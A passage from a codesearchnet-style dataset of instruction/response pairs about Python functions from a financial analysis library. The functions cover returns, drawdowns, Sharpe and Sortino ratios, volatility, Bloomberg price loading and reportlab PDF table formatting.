if first_n_yrs:\n            first_n_yrs = first_n_yrs if not np.isscalar(first_n_yrs) else [first_n_yrs]\n            for first in first_n_yrs:\n                after = '12/31/%s' % (self.dly.index[0].year + first)\n                firstN = self.truncate(after=after)\n                results['first {0}yrs'.format(first)] = summary_fct(firstN)\n\n        # Ranges\n        if ranges:\n            for range in ranges:\n                yr_start, yr_end = range\n                rng_rets = self.truncate('1/1/%s' % yr_start, '12/31/%s' % yr_end)\n                results['{0}-{1}'.format(yr_start, yr_end)] = summary_fct(rng_rets)\n\n        # Prior n years\n        if prior_n_yrs:\n            prior_n_yrs = prior_n_yrs if not np.isscalar(prior_n_yrs) else [prior_n_yrs]\n            for prior in prior_n_yrs:\n                before = '1/1/%s' % (self.dly.index[-1].year - prior)\n                priorN = self.truncate(before)\n                results['past {0}yrs'.format(prior)] = summary_fct(priorN)\n\n        # LTD\n        if ltd:\n            results['ltd'] = summary_fct(self)\n\n        return pd.DataFrame(results, index=results.values()[0].keys()).T"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning the axes for the given index.", "response": "def get_axes(self, idx):\n        \"\"\" Allow for simple indexing \"\"\"\n        cidx = 0\n        if idx > 0:\n            cidx = idx % self.ncols\n        ridx = idx / self.ncols\n        return self.axarr[ridx][cidx]"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nplots the cumulative return of specified rets and max drawdowns if selected.", "response": "def plot_return_on_dollar(rets, title='Return on $1', show_maxdd=0, figsize=None, ax=None, append=0, label=None, **plot_args):\n    \"\"\" Show the cumulative return of specified rets and max drawdowns if selected.\"\"\"\n    crets = (1. + returns_cumulative(rets, expanding=1))\n    if isinstance(crets, pd.DataFrame):\n        tmp = crets.copy()\n        for c in tmp.columns:\n            s = tmp[c]\n            fv = s.first_valid_index()\n            fi = s.index.get_loc(fv)\n            if fi != 0:\n                tmp.ix[fi - 1, c] = 1.\n            else:\n                if not s.index.freq:\n                    # no frequency set\n                    freq = guess_freq(s.index)\n                    s = s.asfreq(freq)\n                first = s.index.shift(-1)[0]\n                tmp = pd.concat([pd.DataFrame({c: [1.]}, index=[first]), tmp])\n        crets = tmp\n        if append:\n            toadd = crets.index.shift(1)[-1]\n            crets = pd.concat([crets, pd.DataFrame(np.nan, columns=crets.columns, index=[toadd])])\n    else:\n        fv = crets.first_valid_index()\n        fi = crets.index.get_loc(fv)\n        if fi != 0:\n            crets = crets.copy()\n            crets.iloc[fi - 1] = 1.\n        else:\n            if not crets.index.freq:\n                first = crets.asfreq(guess_freq(crets.index)).index.shift(-1)[0]\n            else:\n                first = crets.index.shift(-1)[0]\n            tmp = pd.Series([1.], index=[first])\n            tmp = tmp.append(crets)\n            crets = tmp\n\n        if append:\n            toadd = pd.Series(np.nan, index=[crets.index.shift(1)[-1]])\n            crets = crets.append(toadd)\n\n    ax = crets.plot(figsize=figsize, title=title, ax=ax, label=label, **plot_args)\n    AxesFormat().Y.apply_format(new_float_formatter()).X.label(\"\").apply(ax)\n    #ax.tick_params(labelsize=14)\n    if show_maxdd:\n        # find the max drawdown available by using original rets\n        if isinstance(rets, pd.DataFrame):\n            iterator = rets.iteritems()\n        else:\n            iterator = iter([('', rets)])\n\n        for c, col in iterator:\n            dd, dt = max_drawdown(col, inc_date=1)\n            lbl = c and c + ' maxdd' or 'maxdd'\n            # get cret to place annotation correctly\n            if isinstance(crets, pd.DataFrame):\n                amt = crets.ix[dt, c]\n            else:\n                amt = crets[dt]\n\n            bbox_props = dict(boxstyle=\"round\", fc=\"w\", ec=\"0.5\", alpha=0.7)\n            # sub = lambda c: c and len(c) > 2 and c[:2] or c\n            try:\n                dtstr = '{0}'.format(dt.to_period())\n            except:\n                dtstr = '{0}'.format(dt)\n\n            ax.text(dt, amt, \"mdd {0}\".format(dtstr).strip(), ha=\"center\",\n                    va=\"center\", size=10, bbox=bbox_props)\n    plt.tight_layout()"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef periodicity(freq_or_frame):\n    if hasattr(freq_or_frame, 'rule_code'):\n        rc = freq_or_frame.rule_code\n        rc = rc.split('-')[0]\n        factor = PER_YEAR_MAP.get(rc, None)\n        if factor is not None:\n            return factor / abs(freq_or_frame.n)\n        else:\n            raise Exception('Failed to determine periodicity. No factor mapping for %s' % freq_or_frame)\n    elif isinstance(freq_or_frame, basestring):\n        factor = PER_YEAR_MAP.get(freq_or_frame, None)\n        if factor is not None:\n            return factor\n        else:\n            raise Exception('Failed to determine periodicity. No factor mapping for %s' % freq_or_frame)\n    elif isinstance(freq_or_frame, (pd.Series, pd.DataFrame, pd.TimeSeries)):\n        freq = freq_or_frame.index.freq\n        if not freq:\n            freq = pd.infer_freq(freq_or_frame.index)\n            if freq:\n                return periodicity(freq)\n            else:\n                # Attempt to resolve it\n                import warnings\n\n                freq = guess_freq(freq_or_frame.index)\n                warnings.warn('frequency not set. guessed it to be %s' % freq)\n                return periodicity(freq)\n        else:\n            return periodicity(freq)\n    else:\n        raise ValueError(\"periodicity expects DataFrame, Series, or rule_code property\")", "response": "resolve the number of periods per year"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nconverts the scale to an annualzation factor.", "response": "def _resolve_periods_in_year(scale, frame):\n    \"\"\" Convert the scale to an annualzation factor.  If scale is None then attempt to resolve from frame. If scale is a scalar then\n        use it. If scale is a string then use it to lookup the annual factor\n    \"\"\"\n    if scale is None:\n        return periodicity(frame)\n    elif isinstance(scale, basestring):\n        return periodicity(scale)\n    elif np.isscalar(scale):\n        return scale\n    else:\n        raise ValueError(\"scale must be None, scalar, or string, not %s\" % type(scale))"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef returns(prices, method='simple', periods=1, fill_method='pad', limit=None, freq=None):\n    if method not in ('simple', 'compound', 'log'):\n        raise ValueError(\"Invalid method type. Valid values are ('simple', 'compound')\")\n\n    if method == 'simple':\n        return prices.pct_change(periods=periods, fill_method=fill_method, limit=limit, freq=freq)\n    else:\n        if freq is not None:\n            raise NotImplementedError(\"TODO: implement this logic if needed\")\n\n        if isinstance(prices, pd.Series):\n            if fill_method is None:\n                data = prices\n            else:\n                data = prices.fillna(method=fill_method, limit=limit)\n\n            data = np.log(data / data.shift(periods=periods))\n            mask = pd.isnull(prices.values)\n            np.putmask(data.values, mask, np.nan)\n            return data\n        else:\n            return pd.DataFrame(\n                {name: returns(col, method, periods, fill_method, limit, freq) for name, col in prices.iteritems()},\n                columns=prices.columns,\n                index=prices.index)", "response": "Compute the returns for the specified prices."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef returns_cumulative(returns, geometric=True, expanding=False):\n    if expanding:\n        if geometric:\n            return (1. + returns).cumprod() - 1.\n        else:\n            return returns.cumsum()\n    else:\n        if geometric:\n            return (1. + returns).prod() - 1.\n        else:\n            return returns.sum()", "response": "returns the cumulative returns of a sequence of returns"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns the rolling cumulative returns", "response": "def rolling_returns_cumulative(returns, window, min_periods=1, geometric=True):\n    \"\"\" return the rolling cumulative returns\n\n    Parameters\n    ----------\n    returns : DataFrame or Series\n    window : number of observations\n    min_periods : minimum number of observations in a window\n    geometric : link the returns geometrically\n    \"\"\"\n    if geometric:\n        rc = lambda x: (1. + x[np.isfinite(x)]).prod() - 1.\n    else:\n        rc = lambda x: (x[np.isfinite(x)]).sum()\n\n    return pd.rolling_apply(returns, window, rc, min_periods=min_periods)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef returns_annualized(returns, geometric=True, scale=None, expanding=False):\n    scale = _resolve_periods_in_year(scale, returns)\n    if expanding:\n        if geometric:\n            n = pd.expanding_count(returns)\n            return ((1. + returns).cumprod() ** (scale / n)) - 1.\n        else:\n            return pd.expanding_mean(returns) * scale\n    else:\n        if geometric:\n            n = returns.count()\n            return ((1. + returns).prod() ** (scale / n)) - 1.\n        else:\n            return returns.mean() * scale", "response": "returns the annualized cumulative returns"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef drawdowns(returns, geometric=True):\n    wealth = 1. + returns_cumulative(returns, geometric=geometric, expanding=True)\n    values = wealth.values\n    if values.ndim == 2:\n        ncols = values.shape[-1]\n        values = np.vstack(([1.] * ncols, values))\n        maxwealth = pd.expanding_max(values)[1:]\n        dds = wealth / maxwealth - 1.\n        dds[dds > 0] = 0  # Can happen if first returns are positive\n        return dds\n    elif values.ndim == 1:\n        values = np.hstack(([1.], values))\n        maxwealth = pd.expanding_max(values)[1:]\n        dds = wealth / maxwealth - 1.\n        dds[dds > 0] = 0  # Can happen if first returns are positive\n        return dds\n    else:\n        raise ValueError('unable to process array with %s dimensions' % values.ndim)", "response": "compute the drawdown series for the period return series\n   "}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef max_drawdown(returns=None, geometric=True, dd=None, inc_date=False):\n    if (returns is None and dd is None) or (returns is not None and dd is not None):\n        raise ValueError('returns and drawdowns are mutually exclusive')\n\n    if returns is not None:\n        dd = drawdowns(returns, geometric=geometric)\n\n    if isinstance(dd, pd.DataFrame):\n        vals = [max_drawdown(dd=dd[c], inc_date=inc_date) for c in dd.columns]\n        cols = ['maxxdd'] + (inc_date and ['maxdd_dt'] or [])\n        res = pd.DataFrame(vals, columns=cols, index=dd.columns)\n        return res if inc_date else res.maxdd\n    else:\n        mddidx = dd.idxmin()\n        # if mddidx == dd.index[0]:\n        # # no maxff\n        #    return 0 if not inc_date else (0, None)\n        #else:\n        sub = dd[:mddidx]\n        start = sub[::-1].idxmax()\n        mdd = dd[mddidx]\n        # return start, mddidx, mdd\n        return mdd if not inc_date else (mdd, mddidx)", "response": "compute the max drawdown for a single stage"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncalculate the Sharpe of a single resource in a single resource.", "response": "def sharpe(returns, rfr=0, expanding=0):\n    \"\"\"\n    returns: periodic return string\n    rfr: risk free rate\n    expanding: bool\n    \"\"\"\n    if expanding:\n        excess = excess_returns(returns, rfr)\n        return pd.expanding_mean(excess) / pd.expanding_std(returns)\n    else:\n        return excess_returns(returns, rfr).mean() / returns.std()"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncomputes the downside deviation for the specifed return series.", "response": "def downside_deviation(rets, mar=0, expanding=0, full=0, ann=0):\n    \"\"\"Compute the downside deviation for the specifed return series\n    :param rets: periodic return series\n    :param mar: minimum acceptable rate of return (MAR)\n    :param full: If True, use the lenght of full series. If False, use only values below MAR\n    :param expanding:\n    :param ann: True if result should be annualized\n    \"\"\"\n    below = rets[rets < mar]\n    if expanding:\n        n = pd.expanding_count(rets)[below.index] if full else pd.expanding_count(below)\n        dd = np.sqrt(((below - mar) ** 2).cumsum() / n)\n        if ann:\n            dd *= np.sqrt(periods_in_year(rets))\n        return dd.reindex(rets.index).ffill()\n    else:\n        n = rets.count() if full else below.count()\n        dd = np.sqrt(((below - mar) ** 2).sum() / n)\n        if ann:\n            dd *= np.sqrt(periods_in_year(rets))\n        return dd"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef sortino_ratio(rets, rfr_ann=0, mar=0, full=0, expanding=0):\n    annrets = returns_annualized(rets, expanding=expanding) - rfr_ann\n    return annrets / downside_deviation(rets, mar=mar, expanding=expanding, full=full, ann=1)", "response": "Compute the sortino ratio of a period of return series."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncompute the score percentile for the specified window.", "response": "def rolling_percentileofscore(series, window, min_periods=None):\n    \"\"\"Computue the score percentile for the specified window.\"\"\"\n    import scipy.stats as stats\n\n    def _percentile(arr):\n        score = arr[-1]\n        vals = arr[:-1]\n        return stats.percentileofscore(vals, score)\n\n    notnull = series.dropna()\n    min_periods = min_periods or window\n    if notnull.empty:\n        return pd.Series(np.nan, index=series.index)\n    else:\n        return pd.rolling_apply(notnull, window, _percentile, min_periods=min_periods).reindex(series.index)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef hurst_exponent(px, lags=range(2, 100)):\n    ts = px.reset_index(drop=True).dropna()\n    # Calculate the array of the variances of the lagged differences\n    tau = [np.sqrt(ts.diff(lag).std()) for lag in lags]\n    # Use a linear fit to estimate the Hurst Exponent\n    poly = np.polyfit(np.log(lags), np.log(tau), 1)\n    # Return the Hurst exponent from the polyfit output\n    return poly[0] * 2.0", "response": "Estimate the Hurst exponent of a series in a random order"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns an array of Pdf Objects which constitute a Header", "response": "def new_title_bar(self, title, color=None):\n        \"\"\"Return an array of Pdf Objects which constitute a Header\"\"\"\n        # Build a title bar for top of page\n        w, t, c = '100%', 2, color or HexColor('#404040')\n        title = '<b>{0}</b>'.format(title)\n        if 'TitleBar' not in self.stylesheet:\n            tb = ParagraphStyle('TitleBar', parent=self.stylesheet['Normal'], fontName='Helvetica-Bold', fontSize=10,\n                                leading=10, alignment=TA_CENTER)\n            self.stylesheet.add(tb)\n        return [HRFlowable(width=w, thickness=t, color=c, spaceAfter=2, vAlign='MIDDLE', lineCap='square'),\n                self.new_paragraph(title, 'TitleBar'),\n                HRFlowable(width=w, thickness=t, color=c, spaceBefore=2, vAlign='MIDDLE', lineCap='square')]"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef build_page(self, template_id, flowable_map):\n        pt = self.get_page_template(template_id)\n        # If this is the first page then ensure the page template is ordered first and no breaks or changes\n        # are requested otherwise blank page shows up\n        if self.active_template_id is None:\n            self.make_template_first(template_id)\n            self.story.append(NextPageTemplate(template_id))\n            self.inc_cover and self.story.append(PageBreak())\n            self.active_template_id = template_id\n        elif self.active_template_id == template_id:\n            # TODO - understand why this is necessary to not get a blank page between pages\n            self.story.append(PageBreak())\n        else:\n            self.story.append(NextPageTemplate(template_id))\n            self.story.append(PageBreak())\n            self.active_template_id = template_id\n\n        for idx, frame in enumerate(pt.frames):\n            if frame.id not in flowable_map:\n                # Add a note to the template to show that nothing was defined for this area\n                self.story.append(Paragraph('NOT DEFINED: %s' % frame.id, getSampleStyleSheet()['Normal']))\n            else:\n                flowables = flowable_map[frame.id]\n                if not isinstance(flowables, Flowable) and hasattr(flowables, '__iter__'):\n                    [self.story.append(f) for f in flowables]\n                else:\n                    self.story.append(flowables)\n            if idx < (len(pt.frames) - 1):\n                self.story.append(FrameBreak())\n        return self", "response": "Build a pdf page by looking up the specified template and then mapping the flowable_map items to the appropriate named Frame\n           "}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ndefine a simple grid template. This will define nrows * ncols frames and which will be indexed starting with 0 and 1. So 0 1 is row 0 and 1 is col 1.", "response": "def define_simple_grid_template(self, template_id, nrows, ncols):\n        \"\"\"Define a simple grid template. This will define nrows*ncols frames, which will be indexed starting with '0,0'\n            and using numpy style indexing. So '0,1' is row 0 , col 1\"\"\"\n        template = GridTemplate(template_id, nrows, ncols)\n        [template.define_frame('%s,%s' % (i, j), template[i, j]) for i in range(nrows) for j in range(ncols)]\n        template.register(self)\n        return self"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning a table formatter for the dataframe.", "response": "def table_formatter(self, dataframe, inc_header=1, inc_index=1):\n        \"\"\"Return a table formatter for the dataframe. Saves the user the need to import this class\"\"\"\n        return TableFormatter(dataframe, inc_header=inc_header, inc_index=inc_index)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning the market value for the specified Series of pxs", "response": "def get_mkt_val(self, pxs=None):\n        \"\"\"  return the market value series for the specified Series of pxs \"\"\"\n        pxs = self._closing_pxs if pxs is None else pxs\n        return pxs * self.multiplier"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef buy_and_hold(self, qty=1., start_dt=None, end_dt=None, start_px=None, end_px=None):\n        from tia.analysis.model.trd import TradeBlotter\n\n        eod = self.pricer.get_eod_frame().close\n\n        start_dt = start_dt and pd.to_datetime(start_dt) or eod.index[0]\n        start_px = start_px or eod.asof(start_dt)\n        end_dt = end_dt and pd.to_datetime(end_dt) or eod.index[-1]\n        end_px = end_px or eod.asof(end_dt)\n\n        pricer = self.pricer.trunace(start_dt, end_dt)\n        blotter = TradeBlotter()\n        blotter.ts = start_dt\n        blotter.open(qty, start_px)\n        blotter.ts = end_dt\n        blotter.close(end_px)\n        trds = blotter.trades\n        return SingleAssetPortfolio(pricer, trds, ret_calc=self.ret_calc)", "response": "Construct a new portfolio which opens a position with size qty at start and continues to the specified end date."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nload a BAG stock from DataManager.", "response": "def load_bbg_stock(sid_or_accessor, start=None, end=None, dvds=True):\n    \"\"\"terminal and datamgr are mutually exclusive.\n\n    :param sid_or_accessor: security identifier or SidAccessor from DataManager\n    :param start:\n    :param end:\n    :param dvds:\n    :return:\n    \"\"\"\n    end = end and pd.to_datetime(end) or pd.datetime.now()\n    start = start and pd.to_datetime(start) or end + pd.datetools.relativedelta(years=-1)\n\n    FLDS = ['PX_OPEN', 'PX_HIGH', 'PX_LOW', 'PX_LAST']\n    DVD_FLD = 'DVD_HIST_ALL'\n    RENAME = {'PX_OPEN': 'open', 'PX_HIGH': 'high', 'PX_LOW': 'low', 'PX_LAST': 'close'}\n\n    accessor = _resolve_accessor(sid_or_accessor)\n    sid = accessor.sid\n    pxframe = accessor.get_historical(FLDS, start=start, end=end).rename(columns=RENAME)\n    dvdframe = accessor.get_attributes(DVD_FLD, ignore_field_error=1)\n\n    if isinstance(dvdframe, pd.DataFrame):\n        dvdframe = dvdframe[['Ex-Date', 'Dividend Amount']].rename(\n            columns={'Ex-Date': 'date', 'Dividend Amount': 'dvds'})\n        dvdframe = dvdframe.set_index('date').sort_index()\n        dvdframe = dvdframe.truncate(start, end)\n        # sanity check - not expected currently\n        # missing = dvdframe.index.difference(pxframe.index)\n        missing = dvdframe.index - pxframe.index\n        if len(missing) > 0:\n            missing_dates = ','.join([m.strftime('%Y-%m-%d') for m in missing])\n            raise Exception('dividends occur on non-business day, not expecting this. %s' % missing_dates)\n        # another sanity check to ensure yahoo rolls dividends up, in case a special occurs on same day\n        if not dvdframe.index.is_unique:\n            dvdframe = dvdframe.groupby(lambda x: x).sum()\n        pxframe = pxframe.join(dvdframe)\n    pxs = InstrumentPrices(pxframe)\n    return Instrument(sid, pxs, multiplier=1.)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef load_bbg_generic(sid_or_accessor, start=None, end=None):\n    end = end and pd.to_datetime(end) or pd.datetime.now()\n    start = start and pd.to_datetime(start) or end + pd.datetools.relativedelta(years=-1)\n\n    FLDS = ['PX_OPEN', 'PX_HIGH', 'PX_LOW', 'PX_LAST']\n    RENAME = {'PX_OPEN': 'open', 'PX_HIGH': 'high', 'PX_LOW': 'low', 'PX_LAST': 'close'}\n    accessor = _resolve_accessor(sid_or_accessor)\n    sid = accessor.sid\n    pxframe = accessor.get_historical(FLDS, start=start, end=end).rename(columns=RENAME)\n    pxs = InstrumentPrices(pxframe)\n    return Instrument(sid, pxs, multiplier=1.)", "response": "Load a single BAG from a DataManager."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef total_return(self):\n        pxend = self.close\n        pxstart = pxend.shift(1).bfill()\n        return (1. + (pxend - pxstart + self.dvds.fillna(0)) / pxstart).cumprod() - 1", "response": "mimics bloomberg total return - mimics bloomberg total return"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef volatility(self, n, freq=None, which='close', ann=True, model='ln', min_periods=1, rolling='simple'):\n        if model not in ('bbg', 'ln', 'pct'):\n            raise ValueError('model must be one of (bbg, ln, pct), not %s' % model)\n        if rolling not in ('simple', 'exp'):\n            raise ValueError('rolling must be one of (simple, exp), not %s' % rolling)\n\n        px = self.frame[which]\n        px = px if not freq else px.resample(freq, how='last')\n        if model == 'bbg' and periods_in_year(px) == 252:\n            # Bloomberg uses business days, so need to convert and reindex\n            orig = px.index\n            px = px.resample('B').ffill()\n            chg = np.log(px / px.shift(1))\n            chg[chg.index - orig] = np.nan\n            if rolling == 'simple':\n                vol = pd.rolling_std(chg, n, min_periods=min_periods).reindex(orig)\n            else:\n                vol = pd.ewmstd(chg, span=n, min_periods=n)\n            return vol if not ann else vol * np.sqrt(260)\n        else:\n            chg = px.pct_change() if model == 'pct' else np.log(px / px.shift(1))\n            if rolling == 'simple':\n                vol = pd.rolling_std(chg, n, min_periods=min_periods)\n            else:\n                vol = pd.ewmstd(chg, span=n, min_periods=n)\n            return vol if not ann else vol * np.sqrt(periods_in_year(vol))", "response": "Return the annualized volatility series. N is the number of lookback periods."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning the market value series for the series of pxs", "response": "def get_mkt_val(self, pxs=None):\n        \"\"\"Return the market value series for the series of pxs\"\"\"\n        pxs = pxs if pxs is not None else self.pxs.close\n        return pxs * self.multiplier"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns the eod market data frame for pricing", "response": "def get_eod_frame(self):\n        \"\"\"Return the eod market data frame for pricing\"\"\"\n        close = self.pxs.close\n        mktval = self.get_mkt_val(close)\n        dvds = self.pxs.dvds\n        df = pd.DataFrame({'close': close, 'mkt_val': mktval, 'dvds': dvds})\n        df.index.name = 'date'\n        return df"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef truncate(self, before=None, after=None):\n        pxframe = self.pxs.frame\n        if (before is None or before == pxframe.index[0]) and (after is None or after == pxframe.index[-1]):\n            return self\n        else:\n            tpxs = self.pxs.frame.truncate(before, after)\n            return Instrument(self.sid, InstrumentPrices(tpxs), multiplier=self.multiplier)", "response": "Return an instrument with prices starting at before and ending at after"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ninserts a new level in the index with the specified label.", "response": "def insert_level(df, label, level=0, copy=0, axis=0, level_name=None):\n    \"\"\"Add a new level to the index with the specified label. The newly created index will be a MultiIndex.\n\n       :param df: DataFrame\n       :param label: label to insert\n       :param copy: If True, copy the DataFrame before assigning new index\n       :param axis: If 0, then columns. If 1, then index\n       :return:\n    \"\"\"\n    df = df if not copy else df.copy()\n    src = df.columns if axis == 0 else df.index\n    current = [src.get_level_values(lvl) for lvl in range(src.nlevels)]\n    current.insert(level, [label] * len(src))\n    idx = pd.MultiIndex.from_arrays(current)\n    level_name and idx.set_names(level_name, level, inplace=1)\n    if axis == 0:\n        df.columns = idx\n    else:\n        df.index = idx\n    return df"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ndouble exponential moving average", "response": "def APO(series, fast=12, slow=26, matype=0):\n    \"\"\"double exponential moving average\"\"\"\n    return _series_to_series(series, talib.APO, fast, slow, matype)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef MAMA(series, fast=.5, slow=.05):\n    return _series_to_frame(series, ['MAMA', 'FAMA'], talib.MAMA, fast, slow)", "response": "MESA Adaptive Moving Average"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef split(self, amt):\n        ratio = abs(amt / self.qty)\n        t1 = Trade(self.tid, self.ts, amt, self.px, fees=ratio * self.fees, **self.kwargs)\n        t2 = Trade(self.tid, self.ts, self.qty - amt, self.px, fees=(1. - ratio) * self.fees,\n                   **self.kwargs)\n        return [t1, t2]", "response": "return 2 trades 1 with specific amt and other with self. quantity - amt"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef pad_positive_wrapper(fmtfct):\n\n    def check_and_append(*args, **kwargs):\n        result = fmtfct(*args, **kwargs)\n        if fmtfct.parens and not result.endswith(')'):\n            result += ' '\n        return result\n\n    return check_and_append", "response": "Returns a function that adds a blank space to the end of the string if the parentheses are used to denote negative numbers"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\napplies coloring to the current locale.", "response": "def apply_color(formatter, cmap=None, font_bw=1, stripe_rows=1, stripe_cols=0,\n                    hdr_border_clazz=BorderTypeGrid, cell_border_clazz=BorderTypeOutline, border_weight=.7):\n        \"\"\"\n        font_bw: bool, If True use black and white fonts. If False, then use the cmap\n        \"\"\"\n        cmap = cmap or Style.Blue\n        light = cmap.get('Light', white)\n        medium = cmap.get('Medium', gray)\n        dark = cmap.get('Dark', black)\n        # the ranges\n        header = formatter.all.iloc[:formatter.header.nrows]\n        cells = formatter.all.iloc[formatter.header.nrows:]\n        # color the header\n        hdr_border_clazz and header.set_border_type(hdr_border_clazz, color=medium, weight=border_weight)\n        header.set_textcolor(font_bw and white or light)\n        header.set_background(dark)\n        # color the cells\n        cell_border_clazz and cells.set_border_type(cell_border_clazz, color=medium, weight=border_weight)\n        stripe_rows and cells.set_row_backgrounds([light, white])\n        stripe_cols and cells.set_col_backgrounds([white, light])\n        not font_bw and cells.set_textcolor(dark)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef match_column_labels(self, match_value_or_fct, levels=None, max_matches=0, empty_res=1):\n        allmatches = self.parent._find_column_label_positions(match_value_or_fct, levels)\n        # only keep matches which are within this region\n        matches = [m for m in allmatches if m in self.col_ilocs]\n        if max_matches and len(matches) > max_matches:\n            matches = matches[:max_matches]\n\n        if matches:\n            return RegionFormatter(self.parent, self.row_ilocs, pd.Int64Index(matches))\n        elif empty_res:\n            return self.empty_frame()", "response": "Return a new DataFrame with the column labels that match the given value or function."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\niterates over the rows in this region", "response": "def iter_rows(self, start=None, end=None):\n        \"\"\"Iterate each of the Region rows in this region\"\"\"\n        start = start or 0\n        end = end or self.nrows\n        for i in range(start, end):\n            yield self.iloc[i, :]"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\niterate over the cols in this region", "response": "def iter_cols(self, start=None, end=None):\n        \"\"\"Iterate each of the Region cols in this region\"\"\"\n        start = start or 0\n        end = end or self.ncols\n        for i in range(start, end):\n            yield self.iloc[:, i]"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\napplying the specified style cmd to this region.", "response": "def apply_style(self, cmd, *args):\n        \"\"\"\n        Apply the specified style cmd to this region. For example, set all fonts to size 12, apply_style('FONTSIZE', 12)\n        :param cmd: reportlab  format command\n        :param args: arguments for the cmd\n        :return: self\n        \"\"\"\n        for c0, c1 in self.col_coord_tuples:\n            for r0, r1 in self.row_coord_tuples:\n                c = [cmd, (c0, r0), (c1, r1)] + list(args)\n                self.style_cmds.append(c)\n        return self"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\napply the set of styles defined in cmdmap to the current instance.", "response": "def apply_styles(self, cmdmap):\n        \"\"\"\n        Apply the set of commands defined in cmdmap. for example, apply_styles({'FONTSIZE': 12, 'BACKGROUND': white})\n        :param cmdmap: dict of commands mapped to the command arguments\n        :return: self\n        \"\"\"\n        is_list_like = lambda arg: isinstance(arg, (list, tuple))\n        is_first_param_list = lambda c: c in ('COLBACKGROUNDS', 'ROWBACKGROUNDS')\n        for cmd, args in cmdmap.iteritems():\n            if not is_list_like(args):\n                args = [args]\n            elif is_first_param_list(cmd) and is_list_like(args) and not is_list_like(args[0]):\n                args = [args]\n            self.apply_style(cmd, *args)\n        return self"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef detect_colspans(self, use_actual=1):\n        vals = self.actual_values if use_actual else self.formatted_values\n        if self.is_contiguous_cols:\n            for ridx in range(self.nrows):\n                for c0, c1 in span_iter(vals.iloc[ridx, :]):\n                    actual_idx = self.row_ilocs[ridx]\n                    self.style_cmds.append(['SPAN', (c0, actual_idx), (c1, actual_idx)])\n        return self", "response": "Detects if any col spans are present in the values."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ndetecting if any row spans are present in the values.", "response": "def detect_rowspans(self, use_actual=1):\n        \"\"\"Determine if any row spans are present in the values.\n        :param use_actual:  if True, check actual_values for span. if False, use the formatted_values\n        :return: self\n        \"\"\"\n        \"\"\" Determine if any row spans are present\"\"\"\n        vals = self.actual_values if use_actual else self.formatted_values\n        if self.is_contiguous_rows:\n            for cidx in range(self.ncols):\n                for r0, r1 in span_iter(vals.iloc[:, cidx]):\n                    actual_idx = self.col_ilocs[cidx]\n                    self.style_cmds.append(['SPAN', (actual_idx, r0), (actual_idx, r1)])\n        return self"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\napply a format function to each cell in the region and store the result in the formatted_values.", "response": "def apply_format(self, fmtfct):\n        \"\"\"\n        For each cell in the region, invoke fmtfct(cell_value) and store result in the formatted_values\n        :param fmtfct: function(cell_value) which should return a formatted value for display\n        :return: self\n        \"\"\"\n        for ridx in range(self.nrows):\n            for cidx in range(self.ncols):\n                # MUST set the parent as local view is immutable\n                riloc = self.row_ilocs[ridx]\n                ciloc = self.col_ilocs[cidx]\n                self.parent.formatted_values.iloc[riloc, ciloc] = fmtfct(self.actual_values.iloc[ridx, cidx])\n        return self"}
